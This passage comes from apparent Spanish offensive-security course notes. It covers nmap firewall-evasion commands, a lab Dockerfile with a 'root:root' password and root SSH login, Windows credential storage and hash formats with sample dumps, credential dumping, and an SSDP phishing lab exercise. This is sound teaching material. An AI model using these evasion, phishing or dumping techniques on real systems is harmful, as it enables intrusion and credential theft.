bandera <code>RST</code>. A diferencia de las conexiones salientes, todos los intentos de conexi\u00f3n (con la bandera SYN ) procedentes de redes externas suelen ser bloqueados por los cortafuegos. Sin embargo, los paquetes con la bandera ACK a menudo pasan a trav\u00e9s del cortafuegos porque \u00e9ste no puede determinar si la conexi\u00f3n se estableci\u00f3 primero desde la red externa o desde la red interna.</p>"},{"location":"segof/nmap101/#dockerfile","title":"Dockerfile","text":"<pre><code>FROM ubuntu:latest\n\nENV DEBIAN_FRONTEND=noninteractive\n\n# Install necessary packages, including iproute2\nRUN apt-get update &amp;&amp; \\\napt-get install -y iproute2 iputils-ping curl tcpdump iptables nginx openssh-server &amp;&amp; \\\nrm -rf /var/lib/apt/lists/* &amp;&amp; \\\necho \"PermitRootLogin yes\" &gt;&gt; /etc/ssh/sshd_config\n\nRUN mkdir /var/run/sshd\n\n\nRUN echo 'root:root' | chpasswd\n\nEXPOSE 80 22\n\nCMD [\"sh\", \"-c\", \"service nginx start &amp;&amp; /usr/sbin/sshd -D\"]\n</code></pre> <pre><code>docker build -t nmap-demo .\n\ndocker run --privileged -d -p 8080:80 -p 2220:22 --name nmap-demo-c nmap-demo\n</code></pre>"},{"location":"segof/nmap101/#bypass-del-bloqueo-de-paquetes-syn","title":"Bypass del bloqueo de paquetes SYN","text":"<pre><code>iptables -I INPUT -p tcp --tcp-flags ALL SYN -j REJECT --reject-with tcp-reset\n\nnmap -p22,80 -sT\n\nsudo nmap -p22,80 -sS\n\nsudo nmap -p22,80 -sX\n</code></pre>"},{"location":"segof/nmap101/#bypass-del-bloqueo-por-tamano-de-paquete-con-stealth-scan","title":"Bypass del bloqueo por tama\u00f1o de paquete con Stealth scan","text":"<pre><code>iptables -F INPUT\n\niptables -I INPUT -p tcp -m length --length 60 -j REJECT --reject-with tcp-reset\n\nnmap -p22,80 -sT\n\nsudo nmap -p22,80 -sS\n\niptables -nvL INPUT\n\niptables -I INPUT -p tcp -m length --length 44 -j REJECT --reject-with tcp-reset\niptables -I INPUT -p tcp -m length --length 40 -j REJECT --reject-with tcp-reset\n\nnmap -p22,80 -sT\n\nsudo nmap -p22,80 -sX\n\nsudo nmap -p22,80 --data-length 41 \n\niptables -I INPUT -p tcp -m length --length 1:150 -j REJECT --reject-with tcp-reset\n</code></pre>"},{"location":"segof/nmap101/#bypass-de-bloqueo-por-filtrado-de-puerto-de-origen","title":"Bypass de bloqueo por filtrado de puerto de origen","text":"<pre><code>iptables -I INPUT -p tcp --sport 11222 -j ACCEPT\niptables -A INPUT -p tcp -j REJECT --reject-with tcp-reset\n\nsudo nmap -p22,80 -g 11222\n</code></pre>"},{"location":"segof/nmap101/#bypass-de-bloqueo-por-filtrado-de-direcciones-mac-mac-spoofing","title":"Bypass de bloqueo por filtrado de direcciones MAC (MAC spoofing)","text":"<pre><code>iptables -I INPUT -p tcp -m mac --mac-source \"73:3b:3a:98:fc:4d\" -j ACCEPT\niptables -A INPUT -p tcp -j REJECT --reject-with tcp-reset\n\nsudo nmap -p22,80 --spoof-mac 73:3b:3a:98:fc:4d\n</code></pre>"},{"location":"segof/nmap101/#bypass-de-bloqueo-por-filtrado-de-direcciones-ip-ip-spoofing","title":"Bypass de bloqueo por filtrado de direcciones IP (IP spoofing)","text":"<pre><code>.2\n\nsudo nmap -p22,80 -e eth0 -S x.x.x.x -sS x.x.x.x\n</code></pre>"},{"location":"segof/passw_manag/","title":"Teor\u00eda b\u00e1sica gesti\u00f3n contrase\u00f1as en Windows","text":""},{"location":"segof/passw_manag/#credenciales-en-windows","title":"Credenciales en Windows","text":"<p>El sistema operativo Windows tiene muchos lugares diferentes donde almacena o cachea sus credenciales. A continuaci\u00f3n se nombran algunos de los tipos de credenciales de Windows que almacena y las ubicaciones donde se pueden encontrar estas credenciales:</p> <ul> <li> <p>Base de datos del administrador de cuentas de seguridad (SAM).</p> <p>La base de datos SAM es un archivo que est\u00e1 presente en todos los sistemas Windows.</p> <p>Este archivo contiene todas las cuentas creadas, as\u00ed como todas las cuentas integradas que se encuentran en un sistema operativo Windows (XP, Vista, Win7, 8.1 y 10). Las contrase\u00f1as se almacenan aqu\u00ed como hashes. (hash de contrase\u00f1a NT)</p> </li> <li> <p>Otros archivos</p> <p>Las contrase\u00f1as tambi\u00e9n se pueden encontrar en una gran variedad de archivos, incluidos los archivos de configuraci\u00f3n y los archivos creados por el usuario (generalmente en texto plano).</p> <p>Ciertos archivos de registro pueden contener informaci\u00f3n de credenciales, como los registros del instalador, y en ocasiones tambi\u00e9n se pueden encontrar en los informes de vulnerabilidades.</p> </li> <li> <p>Credenciales en cach\u00e9</p> <p>Las credenciales de dominio se almacenan en cach\u00e9 en el registro para permitir que los usuarios inicien sesi\u00f3n en su sistema cuando no est\u00e1 conectado al dominio.</p> <p>El sistema de Windows almacena en cach\u00e9 los \u00faltimos 10 hashes de inicio de sesi\u00f3n y algunos almacenan hasta 25 de forma predeterminada. Este n\u00famero es configurable en el registro.</p> <p>Como ya se ha dicho, esto permite que si se pierda la conectividad con el Domain Controller de Active Directory, por la raz\u00f3n que sea, podamos al menos acceder a nuestro sistema.</p> </li> <li> <p>Secreto de la autoridad de seguridad local (LSA)</p> <p>Los secretos de LSA se almacenan en el registro y permiten que los servicios se ejecuten con privilegios de usuario. Esto incluye VPN, tareas programadas, inicios de sesi\u00f3n autom\u00e1ticos, cuentas de servicio de copia de seguridad, sitios web de IIS, etc. Se incluyen en el registro de Seguridad/Pol\u00edtica/Secretos en forma cifrada.</p> </li> <li> <p>Proceso de servicio del subsistema de la autoridad de seguridad local (LSASS)</p> <p>Al iniciar sesi\u00f3n en una m\u00e1quina con Windows, ya sea localmente o en un dominio, las credenciales se almacenan en el proceso LSASS en la memoria.</p> <p>Esto se usa principalmente para permitir que el usuario acceda a otros recursos en la red a los que est\u00e1 autorizado a acceder sin tener que volver a autenticarse. </p> <p>Los formatos almacenados pueden ser texto sin formato (cifrado reversible), hash NT y LM y tickets Kerberos.</p> </li> <li> <p>Credential Manager</p> <p>El administrador viene preinstalado ya en Windows 7 y superiores</p> <p>B\u00e1sicamente es un almac\u00e9n digital que permite a los usuarios almacenar las credenciales de usuario de forma \"segura\". Todas las credenciales se almacenan en una carpeta espec\u00edfica en el sistema de Windows. </p> <p>Se almacenan passwords de inicio de sesi\u00f3n en Windows, as\u00ed como credenciales web (credenciales del navegador, Skype, Office...) + Base de datos de dominio de Active Directory (NTDS.DIT)</p> <p>Esta base de datos almacena todas las credenciales de los usuarios y equipos ubicados en cada servidor de controlador de dominio de Active Directory, en un entorno de dominio de Active Directory. </p> <p>Este archivo est\u00e1 ubicado en el directorio: <code>%SystemRoot%\\NTDS)</code></p> </li> </ul>"},{"location":"segof/passw_manag/#tipos-de-hashes-de-credenciales-en-windows","title":"Tipos de hashes de credenciales en Windows","text":""},{"location":"segof/passw_manag/#hash-lm","title":"Hash LM","text":"<p>El hash LAN Manager fue uno de los primeros algoritmos de hash de contrase\u00f1as que usaron los sistemas operativos Windows y la \u00fanica versi\u00f3n compatible, hasta la llegada de NTLM, que se usaba en Windows 2000, XP, Vista y 7. Los sistemas operativos m\u00e1s nuevos a\u00fan admiten el uso de hash LM con fines de compatibilidad con versiones anteriores. Sin embargo, est\u00e1 deshabilitado de forma predeterminada para Windows Vista y Windows 7.</p> <p>Como ya se ha indicado, LM se desactiv\u00f3 de manera predeterminada a partir de Windows Vista/Server 2008, pero a\u00fan podr\u00eda permanecer en una red si todav\u00eda se usan </p> <p>Si realizaramos un volcado de la base de datos SAM/NTDS, se muestran junto con NTHash, antes de los dos puntos.</p> <p>Ejemplo</p> <ul> <li> <p>Si los hashes LM est\u00e1n habilitados en el sistema (Win XP y versiones anteriores), un volcado de hash se ver\u00e1 as\u00ed:</p> <p><code>Administrador:500:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537:::</code></p> </li> <li> <p>Si los hashes LM est\u00e1n deshabilitados en el sistema (Win Vista, 7, 8+), un volcado de hash se ver\u00e1 as\u00ed:</p> <p><code>Administrador:500:SIN \u200b\u200bCONTRASE\u00d1A*********************:0CB6948805F797BF2A82807973B89537:::</code></p> </li> </ul>"},{"location":"segof/passw_manag/#desglose-de-un-hash-lm","title":"Desglose de un hash LM","text":"<ul> <li> <p>Primer campo: el nombre de usuario</p> </li> <li> <p>Segundo campo: el SID (Security IDentifier) \u200b\u200bpara ese nombre de usuario</p> </li> <li> <p>Tercer campo: el hash LM</p> </li> <li> <p>Cuarto campo: el hash NTLM</p> </li> </ul>"},{"location":"segof/passw_manag/#mecanica-hash-lm","title":"Mec\u00e1nica hash LM","text":"<ul> <li> <p>Cuando un usuario crea una nueva contrase\u00f1a, esta contrase\u00f1a se convierte a may\u00fasculas</p> </li> <li> <p>Luego se rellena a 14 caracteres, utilizando 0s </p> </li> <li> <p>M\u00e1s tarde, la contrase\u00f1a se divide en dos fragmentos de 7 bytes.</p> </li> <li> <p>Los dos fragmentos se utilizar\u00e1n como clave en un cifrado de Est\u00e1ndar de cifrado de datos (DES) para cifrar un valor fijo</p> </li> <li> <p>Los valores de las dos operaciones DES se concatenan y el resultado se almacena como el hash LM</p> </li> </ul>"},{"location":"segof/passw_manag/#debilidades-de-hash-de-lm","title":"Debilidades de hash de LM","text":"<ul> <li> <p>La longitud de la contrase\u00f1a est\u00e1 limitada a 14 caracteres, dividida en dos partes independientes de 7 bytes</p> </li> <li> <p>La contrase\u00f1a no distingue entre may\u00fasculas y min\u00fasculas, lo que reduce el espacio de claves disponible para que los usuarios elijan sus contrase\u00f1as</p> </li> </ul>"},{"location":"segof/passw_manag/#nthash-aka-ntlm","title":"NTHash (a.k.a NTLM)","text":"<p>Esta es la forma en que se almacenan las contrase\u00f1as en los sistemas Windows modernos ya que fue creado para ser el sucesor de LM y estos hashes se pueden obtener volcando la base de datos SAM o usando la famosa herramienta Mimikatz. Tambi\u00e9n se almacenan en controladores de dominio en el archivo NTDS.</p> <p>Este tipo de hashes se pueden emplear para llevar a cabo la t\u00e9cnica conocida como Pass-the-Hash</p> <p>Por lo general, se suele denominar a esto el hash NTLM (o simplemente NTLM), lo cual es enga\u00f1oso, ya que Microsoft se refiere a esto como NTHash (al menos en algunas fuentes). </p>"},{"location":"segof/passw_manag/#mecanica-ntlm","title":"Mec\u00e1nica NTLM","text":"<ul> <li> <p>Toma la contrase\u00f1a, la codifica usando el algoritmo MD4</p> </li> <li> <p>No rompe la contrase\u00f1a en trozos</p> </li> <li> <p>La contrase\u00f1a distingue entre may\u00fasculas y min\u00fasculas</p> </li> <li> <p>Puede admitir contrase\u00f1as muy largas (127 caracteres)</p> </li> </ul>"},{"location":"segof/passw_manag/#ntlmv1-aka-net-ntlmv1","title":"NTLMv1 (a.k.a Net-NTLMv1)","text":"<p>La v1 del protocolo utiliza el hash NT y LM, seg\u00fan la configuraci\u00f3n y lo que est\u00e9 disponible. </p> <p>NTLM utiliza un procedimiento de desaf\u00edo/respuesta para autenticar a los participantes de la red. El cliente y el host siguen los siguientes pasos:</p> <ol> <li> <p>El cliente env\u00eda un nombre de usuario al host.</p> </li> <li> <p>El host responde con un n\u00famero aleatorio, el desaf\u00edo.</p> </li> <li> <p>El cliente crea un valor a partir de ese n\u00famero y el hash de la contrase\u00f1a del usuario y lo devuelve como respuesta.</p> </li> <li> <p>Del mismo modo, el host, que tambi\u00e9n conoce el hash de la contrase\u00f1a (est\u00e1 en la SAM), crea el valor y, a continuaci\u00f3n, lo compara con la respuesta del cliente.</p> </li> <li> <p>Si ambos valores coinciden, se confirma la autenticidad del cliente y se permite el acceso. Si no hay coincidencia, se bloquea al cliente.</p> </li> </ol> <p></p>"},{"location":"segof/passw_manag/#ntlmv2-aka-net-ntlmv2","title":"NTLMv2 (a.k.a Net-NTLMv2)","text":"<p>Esta es la versi\u00f3n nueva y mejorada del protocolo NTLM, lo que lo hace un poco m\u00e1s dif\u00edcil de descifrar. El concepto es el mismo que NTLMv1, s\u00f3lo cambia el algoritmo utilizado para cifrar y las respuestas enviadas al servidor. </p> <p>NTLMv2 necesita adem\u00e1s que la posible diferencia horaria entre clientes y servidores no supere los 30 minutos.</p> <p>Ejemplo</p> <p><code>admin::n46isnekpt:08CA45B7D7EA58EE:88DCBE4446168966A153A0064958DAC6: 5C7830315C78303100100000000000b45c67103d07d7b95acd12fa11230E0000000052920b85f78d013c31cdb3b92f5d765c783030</code></p>"},{"location":"segof/passw_manag/#dumping-de-credenciales","title":"Dumping de credenciales","text":"<p>El dumping de credenciales es un tipo de ciberataque en el que se vulnera un ordenador y el atacante obtiene los nombres de usuario y las contrase\u00f1as. Esto puede ser perjudicial si le ocurre a su ordenador personal, pero puede ser absolutamente devastador si un atacante es capaz de realizar el vertido de credenciales en un ordenador que forma parte de una red mayor.</p> <p>Esta t\u00e9cnica de hacking se implementa despu\u00e9s de que un ordenador haya sido comprometido por el atacante. Los nombres de usuario y las contrase\u00f1as son extremadamente valiosos para los ciberdelincuentes y pueden utilizarse para adquirir informaci\u00f3n sensible, as\u00ed como para obtener acceso a las credenciales de administrador y otras cuentas privilegiadas o a otros ordenadores de una red.</p> <p>Despu\u00e9s de obtener acceso a un ordenador, un atacante llevar\u00e1 a cabo el dumping o volcado de credenciales accediendo a la cach\u00e9 de contrase\u00f1as que se almacenan en la memoria de su ordenador.</p> <p>Para la comodidad del usuario, los sistemas operativos y los navegadores tienen la capacidad de guardar los nombres de usuario y las contrase\u00f1as y luego rellenar autom\u00e1ticamente su informaci\u00f3n de acceso a los sitios y programas que frecuenta. Desgraciadamente, esta comodidad tiene un coste y puede dejar la informaci\u00f3n m\u00e1s vulnerable al robo de credenciales y al dumping.</p>"},{"location":"segof/passw_manag/#de-donde-se-puede-realizar-un-dumping-de-credenciales","title":"\u00bfDe d\u00f3nde se puede realizar un dumping de credenciales?","text":"<p>Un atacante puede obtener credenciales de diferentes \u00e1reas de un sistema. Con acceso a una computadora terminal regular, un atacante puede buscar credenciales en las siguientes ubicaciones.</p> <ul> <li>WDigest</li> </ul> <p>Este es un protocolo heredado utilizado para autenticar usuarios en Windows. Cuando est\u00e1 habilitado, LSASS mantiene una copia de texto sin formato de la contrase\u00f1a del usuario registrado en la memoria. Si bien el servicio est\u00e1 deshabilitado de forma predeterminada hoy en d\u00eda, todav\u00eda existe en las \u00faltimas versiones de Windows y los atacantes a menudo lo habilitan para robar credenciales.</p> <ul> <li>Administrador de cuentas de seguridad (SAM)</li> </ul> <p>Este es un archivo de base de datos que existe en Windows desde los d\u00edas de XP. SAM se usa para autenticar a los usuarios, tanto locales como remotos, lo que permite el acceso cuando las credenciales proporcionadas coinciden con lo que SAM tiene en el archivo. Si los atacantes roban este archivo, potencialmente se puede descifrar y se pueden extraer los nombres de usuario y las contrase\u00f1as almacenados en \u00e9l.</p> <ul> <li>LSA secrets</li> </ul> <p>La Autoridad de Seguridad Local (LSA) administra la autenticaci\u00f3n y el inicio de sesi\u00f3n de los usuarios en un sistema Windows, as\u00ed como la pol\u00edtica de seguridad local para una computadora. Los datos confidenciales utilizados por este subsistema se almacenan en un \u00e1rea de almacenamiento protegida llamada \"secretos LSA\".</p> <ul> <li>Kerberos</li> </ul> <p>El protocolo Kerberos fue dise\u00f1ado espec\u00edficamente para una autenticaci\u00f3n s\u00f3lida y segura. Lo hace a trav\u00e9s de un sistema de ticketing, otorgando diversos permisos a usuarios y servicios. Los ataques contra Kerberos generalmente implican falsificar o inyectar tickets de Kerberos robados para obtener acceso.</p> <p>Si un atacante logra ingresar a un controlador de dominio, el servidor de red responsable de administrar la autenticaci\u00f3n en el dominio, existen \u00e1reas adicionales donde se almacenan las credenciales.</p> <ul> <li>NTDS</li> </ul> <p>Aqu\u00ed es donde Active Directory almacena informaci\u00f3n sobre los miembros de un dominio para verificar usuarios y credenciales.</p> <ul> <li>Archivos de preferencias de directivas de grupo</li> </ul> <p>Esta herramienta de Windows permite a los administradores implementar directivas de dominio para incluir credenciales incrustadas, lo que facilita la administraci\u00f3n. Estas pol\u00edticas generalmente se almacenan en un recurso compartido llamado SYSVOL, que cualquier usuario del dominio puede ver y potencialmente descifrar.</p> <ul> <li>DCSync</li> </ul> <p>En lugar de una ubicaci\u00f3n, DCSync es una t\u00e9cnica en la que un atacante aprovecha la forma en que los controladores de dominio manejan las llamadas API disponibles. En resumen, el atacante imita el comportamiento de otro controlador de dominio a trav\u00e9s de llamadas a la API y consigue que el controlador env\u00ede hashes de credenciales que se pueden usar en otros ataques.</p>"},{"location":"segof/passw_manag/#mimikatz","title":"Mimikatz","text":"<p>Una de las herramientas m\u00e1s utilizadas para realizar el dumping de credenciales es Mimikatz. Esta herramienta fue creada por Benjamin Delphy en 2007 para demostrar un fallo de seguridad en Windows. Su c\u00f3digo tuvo \u00e9xito y convenci\u00f3 a Microsoft para que acabara corrigiendo el fallo, y Mimikatz sigui\u00f3 utiliz\u00e1ndose para realizar pruebas de penetraci\u00f3n y seguridad.</p> <p>Desafortunadamente, tambi\u00e9n se ha convertido en una herramienta popular para los actores malintencionados.</p>"},{"location":"segof/passw_manag/#como-evitar-el-dumping-de-credenciales","title":"C\u00f3mo evitar el dumping de credenciales","text":"<ul> <li> <p>Limitar y controlar el uso de contrase\u00f1as de administrador.</p> </li> <li> <p>Limitar la reutilizaci\u00f3n de credenciales.</p> </li> <li> <p>Implantar la autenticaci\u00f3n multifactor.</p> </li> <li> <p>Utilizar un gestor de contrase\u00f1as con una contrase\u00f1a fuerte y no almacenada.</p> </li> <li> <p>Implementar un hash y un encriptados fuertes.</p> </li> <li> <p>Supervisar el acceso a servicios como LSASS y bases de datos como SAM con regularidad.</p> </li> <li> <p>Deshabilitar o restringir NT LAN Manager (NTLM)</p> </li> <li> <p>Supervisar los registros de actividades no programadas en el DC</p> </li> <li> <p>No mezclar las cuentas de administrador de dominio con las de grupos de administradores locales</p> </li> </ul>"},{"location":"segof/phising/","title":"Ataques de phising haciendo uso de un servidor SSDP falso","text":""},{"location":"segof/phising/#ssdp-simple-service-discovery-protocol","title":"SSDP (Simple Service Discovery Protocol)","text":"<p>SSDP es un protocolo de red basado en IP y UDP para anunciar y buscar/encontrar dispositivos en una red. Consigue este cometido sin la necesidad de mecanismos de configuraci\u00f3n basados en un servidor (como pueda ser DHCP o DNS) y sin una configuraci\u00f3n est\u00e1tica del host. Para su objetivo, SSDP se apoya en el protocolo UPnP (Universal Plub and Play).</p> <p>UPnP es un set de protocolos de red que permite que dispositivos de red tales como ordenadores personales, impresoras, access-points, Chromecast, NAS, consolas, Smart TVs... descubran entre s\u00ed su presencia en la red y establezcan servicios de comunicaci\u00f3n de red o compartici\u00f3n de datos. Un dispositivos compatible con UPnP no necesita ninguna configuraci\u00f3n de red, puede integrarse en una red, obtener una IP, publicar su nombre y anunciar sus servicios bajo petici\u00f3n, todo de forma autom\u00e1tica. De la misma forma, puede detectar la presencia y servicios de otros dispositivos.</p> <p></p> <p>En principio fue concebido para uso residencial o peque\u00f1os entornos de oficina.</p>"},{"location":"segof/phising/#phising","title":"Phising","text":"<p>Los ataques de phishing son correos electr\u00f3nicos, mensajes de texto, llamadas telef\u00f3nicas o sitios web fraudulentos dise\u00f1ados para enga\u00f1ar a los usuarios para que descarguen programas maliciosos, compartan informaci\u00f3n confidencial o datos personales (por ejemplo, n\u00fameros de la Seguridad Social y de tarjetas de cr\u00e9dito, n\u00fameros de cuentas bancarias, credenciales de inicio de sesi\u00f3n), o realicen otras acciones que les expongan a ellos mismos o a sus organizaciones a la ciberdelincuencia.</p> <p>El phishing es el tipo m\u00e1s com\u00fan de ingenier\u00eda social, la pr\u00e1ctica de enga\u00f1ar, presionar o manipular a las personas para que env\u00eden informaci\u00f3n a las personas equivocadas. Los ataques de ingenier\u00eda social se basan en el error humano y en t\u00e1cticas de presi\u00f3n para tener \u00e9xito. El atacante suele hacerse pasar por una persona u organizaci\u00f3n en la que la v\u00edctima conf\u00eda -por ejemplo, un compa\u00f1ero de trabajo, un jefe, una empresa con la que la v\u00edctima o su empleador hacen negocios- y crea una sensaci\u00f3n de urgencia que lleva a la v\u00edctima a actuar precipitadamente. Los hackers y estafadores utilizan estas t\u00e1cticas porque es m\u00e1s f\u00e1cil y menos costoso enga\u00f1ar a la gente que piratear un ordenador o una red.</p> <p>Seg\u00fan el FBI, los correos electr\u00f3nicos de phishing son el m\u00e9todo de ataque o vector m\u00e1s utilizado por los hackers para enviar ransomware a particulares y organizaciones. Seg\u00fan el informe Cost of a Data Breach 2022 de IBM, el phishing es la segunda causa m\u00e1s com\u00fan de violaci\u00f3n de datos.</p>"},{"location":"segof/phising/#tarea","title":"Tarea","text":"<p>Vamos intentar simular un posible caso real en un ejercicio de red teaming.</p> <p>Nuestra tarea ser\u00e1 realizar una prueba de concepto donde hagamos uso de dos t\u00e9cnicas muy asentadas. En primera instancia haremos spoofing de dispositivos en una supuesta red empresarial y tras ello, vali\u00e9ndonos del phishing, obtendremos las credenciales de los usuarios.</p> <p>Necesitar\u00e9is dos m\u00e1quinas:</p> <ul> <li>Windows/Linux como atacante</li> <li>Windows como v\u00edctima</li> </ul> <p>Pod\u00e9is hacerlo con dos m\u00e1quinas virtuales, con la vuestra f\u00edsica y otra virtual o como quer\u00e1is, lo importante es que se trate de dos m\u00e1quinas diferente.</p> <p>Deb\u00e9is buscar informaci\u00f3n de forma aut\u00f3noma sobre c\u00f3mo llevar a cabo este ataque con lad dos herramienta que os propongo. Os doy un par de referencias:</p> <ul> <li>Evil-SSDP</li> <li>On-the-fly</li> </ul> <p>En uno de los dos casos, dependiendo del SO que utilic\u00e9is, puede que no teng\u00e1is las net-tools instaladas, \u00fanicamente iproute2 por lo que habr\u00e1 que hacer una peque\u00f1a modificaci\u00f3n en el c\u00f3digo Python para que funcione correctamente.</p> <p>Recordad que debe haber una parte de spoofing y otra de phising.</p> <p>Atenci\u00f3n</p> <p>Deb\u00e9is realizar la modificaci\u00f3n del c\u00f3digo en Python, no instalar las net-tools. Recordemos que estamos simulando un escenario real y debemos pasar lo m\u00e1s desapercibidos posibles.</p>"},{"location":"segof/phising/#referencias","title":"Referencias","text":"<p>IBM</p> <p>Imperva</p>"},{"location":"segof/privesc/","title":"Escalada privilegios en Linux y en Windows","text":""},{"location":"segof/privesc/#que-es-una-escalada-de-privilegios","title":"Qu\u00e9 es una escalada de privilegios?","text":"<p>La escalada de privilegios ocurre cuando un usuario malicioso o malintencionado aprovecha una vulnerabilidad, un defecto de dise\u00f1o o un error de configuraci\u00f3n en una aplicaci\u00f3n o sistema operativo para obtener un acceso elevado a los recursos que normalmente no deber\u00edan estar disponibles para ellos.</p> <p>El atacante puede usar los privilegios reci\u00e9n obtenidos para robar datos confidenciales, ejecutar comandos administrativos o implementar malware, y potencialmente causar da\u00f1os graves a su sistema operativo, aplicaciones de servidor, organizaci\u00f3n y reputaci\u00f3n</p> <p>Un escenario t\u00edpico donde se produce una escalada de privilegios es cuando un atacante ya ha conseguido comprometer un sistema y ha obtenido un acceso mediante una cuenta con bajos privilegios. Tras este paso inicial el atacante se encuentra con una situaci\u00f3n donde debe obtener mayores privilegios si quiere realmente comprometer todo el sistema u otras partes de la red.</p> <p>As\u00ed pues, digamos que la escalada de privilegios es el paso siguiente tras obtener un punto de entrada inicial al sistema por parte de un atacante.</p>"},{"location":"segof/privesc/#tipos-de-escaladas-de-privilegios","title":"Tipos de escaladas de privilegios","text":"<p>Como ya hemos dicho, en general, los atacantes aprovechan las vulnerabilidades de escalamiento de privilegios en la fase de ataque inicial para anular las limitaciones de su cuenta de usuario inicial en un sistema o aplicaci\u00f3n. </p> <p>Hay dos tipos principales de escalada de privilegios: escalada de privilegios horizontal para acceder a la funcionalidad y los datos de un usuario diferente y escalada de privilegios vertical para obtener privilegios elevados, generalmente de un administrador del sistema u otro usuario avanzado.</p> <p>Con la escalada horizontal de privilegios, los actores malintencionados permanecen en el mismo nivel general de privilegios, pero pueden acceder a los datos o la funcionalidad de otras cuentas o procesos que no deber\u00edan estar disponibles para ellos. </p> <p>Por ejemplo, esto puede significar usar un equipo comprometido para obtener acceso a los datos de otros usuarios de la oficina. Para las aplicaciones web, un ejemplo de escalamiento horizontal podr\u00eda ser el uso de secuestro de sesi\u00f3n para evitar la autenticaci\u00f3n y obtener acceso a la cuenta de otro usuario en una red social, una plataforma de comercio electr\u00f3nico o un sitio de banca electr\u00f3nica.</p> <p>M\u00e1s peligrosa es la escalada vertical de privilegios (tambi\u00e9n llamada elevaci\u00f3n de privilegios ), donde el atacante obtiene los derechos de una cuenta con m\u00e1s privilegios, generalmente el administrador o usuario del sistema en Microsoft Windows o root en sistemas Unix y Linux. Con este elevado nivel de acceso, el atacante puede causar todo tipo de estragos en sus sistemas inform\u00e1ticos y aplicaciones: robar credenciales de acceso y datos confidenciales, descargar y ejecutar ransomware, borrar datos o ejecutar c\u00f3digo arbitrario. Los atacantes avanzados utilizar\u00e1n privilegios elevados para cubrir sus pistas eliminando los registros de acceso y otras pruebas de su actividad, sin que la v\u00edctima se d\u00e9 cuenta de que se ha producido un ataque. De esa forma, los ciberdelincuentes pueden robar informaci\u00f3n de forma encubierta y colocar puertas traseras u otro malware en los sistemas de la empresa.</p> <p></p> <p>Se suelen utilizar 5 m\u00e9todos principalmente para llevar a cabo la escalada de privilegios:</p> <ul> <li>Explotaci\u00f3n de credenciales</li> <li>Vulnerabilidades y exploits</li> <li>Configuraciones incorrectas</li> <li>Software malicioso</li> <li>Ingenier\u00eda social</li> </ul>"},{"location":"segof/privesc/#como-prevenir-y-mitigar-los-ataques-de-escalada-de-privilegios","title":"\u00bfC\u00f3mo prevenir y mitigar los ataques de escalada de privilegios?","text":"<p>Debido a que los ataques de escalada de privilegios pueden iniciarse y avanzar de muchas formas diferentes, se requieren m\u00faltiples estrategias y t\u00e1cticas de defensa para protegernos.</p> <p>Sin embargo, la implementaci\u00f3n de un enfoque centrado en la identidad y en controles para la administraci\u00f3n de accesos privilegiados permiten protegerse contra la gama m\u00e1s amplia de ataques, as\u00ed como reducir la superficie de ataque. Estas son algunas de las mejores pr\u00e1cticas:</p> <ul> <li> <p>Administrar completamente el ciclo de vida de la autenticaci\u00f3n , incluido el aprovisionamiento y desaprovisionamiento de identidades y cuentas para garantizar que no haya cuentas hu\u00e9rfanas que puedan ser secuestradas.</p> </li> <li> <p>Utilizar un mecanismo de administraci\u00f3n de contrase\u00f1as para aplicar pol\u00edticas s\u00f3lidas de administraci\u00f3n de credenciales tanto para humanos como para m\u00e1quinas. Esto tambi\u00e9n implica eliminar la credencial predeterminada y \"hardcodeada\".</p> </li> <li> <p>Aplicar el privilegio m\u00ednimo: eliminar los derechos de administrador de los usuarios y reducir los privilegios de la aplicaci\u00f3n y la m\u00e1quina al m\u00ednimo requerido. Tambi\u00e9n se debe implementar el acceso \"just-in-time\" para reducir los privilegios permanentes o permanentes.</p> </li> <li> <p>Supervisar y administrar todas las sesiones privilegiadas para detectar y abordar r\u00e1pidamente cualquier actividad sospechosa que pueda indicar una cuenta secuestrada o un intento il\u00edcito de escalada de privilegios o movimiento lateral.</p> </li> <li> <p>Fortalecer los sistemas y las aplicaciones: esto complementa el principio de privilegios m\u00ednimos y puede implicar cambios de configuraci\u00f3n, eliminaci\u00f3n de derechos y accesos innecesarios, cierre de puertos y m\u00e1s. Esto mejora la seguridad del sistema y las aplicaciones y ayuda a prevenir y mitigar los errores potenciales que puedan llevar a una vulnerabilidad de inyecci\u00f3n de c\u00f3digo malicioso, desbordamientos de b\u00fafer u otras puertas traseras que podr\u00edan permitir la escalada de privilegios.</p> </li> <li> <p>Gesti\u00f3n de vulnerabilidades: identificar y abordar de forma continua las vulnerabilidades, mediante parches, correcci\u00f3n de configuraciones incorrectas, eliminaci\u00f3n de credenciales predeterminadas y/o integradas, entre otras.</p> </li> <li> <p>El acceso remoto seguro siempre debe monitorearse y administrarse para cualquier forma de acceso privilegiado, ya que los ataques pueden ocurrir horizontal y verticalmente para explotar los privilegios.</p> </li> </ul>"},{"location":"segof/privesc/#escalada-de-privilegios-en-linux","title":"Escalada de privilegios en Linux","text":"<p>En Linux nuestro objetivo con la escalada de privilegios va a ser siempre obtener una shell corriendo con privilegios del usuario root.</p> <p>En muchos casos la escalada de privilegios no recaer\u00e1 simplemente en una simple mala configuraci\u00f3n, sino que requererir\u00e1 combinar varios m\u00e9todos, debilidades y malas configuraciones para conseguirla.</p> <p>Todas las escaladas de privilegios son ejemplos fehacientes de una violaci\u00f3n de los controles de acceso. Puesto ques los controles de acceso y los permisos de usuario est\u00e1n estrechamente ligados, es crucial entender como funcionan los permisos en Linux, tal y como ya hemos visto con anterioridad.</p> <p>Pasemos ahora a ver algunas de las t\u00e9cnicas que permiten la escalada de privilegios en sistemas Linux..</p>"},{"location":"segof/privesc/#ejercicios","title":"Ejercicios","text":"<p>Cada una de las siguientes escaladas de privilegios la vamos a probar en la sala Linux PrivEsc de Tryhackme a la que deb\u00e9is uniros.</p>"},{"location":"segof/privesc/#permisos-debiles-o-incorrectos-en-archivos","title":"Permisos \"d\u00e9biles\" o incorrectos en archivos","text":"<p>Es posible aprovecharse de algunos archivos de sistema para la escalada de privilegios si los permisos de estos archivos son incorrectos.</p> <p>Si un archivo tiene informaci\u00f3n confidencial que podamos leer, podremos usarlo para conseguir el acceso a la cuenta de root.</p> <p>Por otra parte, si nos topamos con un archivo de sistema sobre el que tenemos permisos de escritura, podremos modificar el comportamiento del sistema operativo y obtener acceso root de este modo.</p> <p>Algunos comandos \u00fatiles:</p> <p>Encontrar todos los archivos sobre los que tenemos permiso de escritura en <code>/etc</code>: <pre><code>$ find /etc -maxdepth 1 -writable -type f\n</code></pre> Encontrar todos los archivos sobre los que tenemos permiso de lectura en <code>/etc</code>: <pre><code>$ find /etc 